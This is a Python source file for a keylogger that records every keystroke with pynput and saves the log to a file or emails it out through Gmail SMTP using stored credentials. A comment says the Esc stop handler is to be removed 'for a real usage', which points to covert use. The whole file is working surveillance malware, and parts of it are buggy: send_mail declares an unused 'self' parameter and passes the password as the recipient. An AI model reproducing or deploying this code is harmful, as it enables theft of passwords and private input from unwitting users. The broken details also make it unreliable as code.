import smtplib
import datetime
from datetime import datetime
from pynput.keyboard import Listener,Key

#------------------------------------------------------------------------------------
class keylloger():
    def __init__(self):
        self.log=''
        self.date_end=''
        self.METHOD_REPORT = ''  #                                      data storage method. either locally or via email
        self.file_path = ""          # folder to store the recording files of our keylogger e.g="C:\\Users\\HP\\Desktop\\test_keylog\\"
        self.ADDRESS_EMAIL = ''                                # address on which to send the recorded data
        self.PASSWORD_EMAIL = ''                                  # The password of the email
    def on_press(self,key): # function to record all characters pressed on the keyboard
        key=str(key).replace("'","")
        if key=='Key.space' :
            key=" "
        elif key=='Key.enter':
            key='[ENTER]\n'
        self.log +=key
    def on_release(self,key):  # function to stop our keylloger( note that for a real usage, this function should be remove)
        if(key==Key.esc):
            print("\nstop")
            self.date_end=str(datetime.now()).replace(":"," ")
            return False
    def write_in_file(self):  # function to write
        filename=f'kelloger-{self.date_end}'
        with open(f"{self.file_path}{filename}.txt",'w') as f:
                for key in self.log:
                    f.write(key)

    def report_method(self):
        if self.METHOD_REPORT =='email':

            send_mail(self.ADDRESS_EMAIL, self.PASSWORD_EMAIL, self.log)
        else:
            self.write_in_file()

#------------------------------------------------------------------------------
def send_mail(self, email, password, message):
    # manages a connection to the SMTP server
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    # connect to the SMTP server as TLS mode ( for security ), the port 587 is the SMTP's default port for the modern web
    server.starttls()
    # login to the email account
    server.login(email, password)
    # send the actual message
    server.sendmail(email,password, message)
    # terminates the session
    server.quit()

#--------------------------------------------------------------------
if __name__=="__main__":
    keylog=keylloger()
    with Listener(on_press=keylog.on_press, on_release=keylog.on_release) as listener:
      listener.join()
    keylog.report_method()
